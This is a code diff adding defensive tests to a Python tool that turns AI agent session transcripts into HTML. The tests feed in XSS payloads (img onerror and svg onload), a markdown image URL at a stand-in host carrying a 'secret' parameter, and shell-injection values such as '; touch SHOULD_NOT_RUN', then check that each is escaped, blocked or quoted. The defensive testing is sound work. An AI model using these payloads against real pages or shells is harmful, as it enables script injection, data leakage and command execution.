@@ -71,3 +71,42 @@ def test_markdown_escapes_raw_html():
     from agentbar.transcript import _text_to_html
     h = _text_to_html("<script>alert(1)</script> 正常文字")
     assert "<script>" not in h
+
+
+def test_legacy_markdown_fallback_escapes_html_inside_math():
+    """mistune 不可用时，公式定界符也不能成为 HTML 注入通道。"""
+    rendered = transcript._text_to_html_legacy(
+        "$<img src=x onerror=alert(1)>$ $$<svg onload=alert(2)>$$"
+    )
+    assert "<img" not in rendered
+    assert "<svg" not in rendered
+    assert "&lt;img" in rendered
+    assert "&lt;svg" in rendered
+
+
+def test_transcript_html_is_offline_and_blocks_remote_images(tmp_path):
+    path = tmp_path / "session.jsonl"
+    path.write_text(
+        '{"type":"assistant","message":{"content":"'
+        '![private](https://evil.example/track?secret=1)"}}\n',
+        encoding="utf-8",
+    )
+    rendered = transcript.to_html("claude", path)
+    assert "Content-Security-Policy" in rendered
+    assert "default-src 'none'" in rendered
+    assert "script-src 'none'" in rendered
+    assert "cdn.jsdelivr.net" not in rendered
+    assert "<script" not in rendered
+    assert "<img" not in rendered
+    assert "evil.example" not in rendered
+    assert "已隐藏外部图片" in rendered
+
+
+def test_resume_command_shell_quotes_cwd_and_session():
+    command = transcript.resume_command(
+        "codex",
+        "/tmp/project; touch SHOULD_NOT_RUN",
+        "sid; touch ALSO_NOT",
+    )
+    assert "cd '/tmp/project; touch SHOULD_NOT_RUN'" in command
+    assert "resume 'sid; touch ALSO_NOT'" in command
